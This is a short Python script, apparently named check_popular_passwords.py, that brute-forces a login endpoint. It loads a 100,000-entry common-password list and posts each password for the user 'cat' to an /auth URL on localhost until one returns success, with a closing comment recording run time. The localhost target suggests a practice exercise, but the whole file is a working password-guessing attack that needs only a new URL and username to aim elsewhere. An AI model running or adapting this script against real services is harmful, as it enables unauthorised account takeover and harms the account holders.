import requests

with open('10-million-password-list-top-100000.txt') as passwords_file:
    passwords = passwords_file.readlines()

# clean_passwords = []
# for password in passwords:
#     clean_passwords.append(password[:-1])

clean_passwords = [password[:-1] for password in passwords]

for password in clean_passwords:
    print(password)
    response = requests.post('http://127.0.0.1:4000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('Success!', 'cat', password)
        break

# python check_popular_passwords.py  31.42s user 3.69s system 57% cpu 1:00.54 total
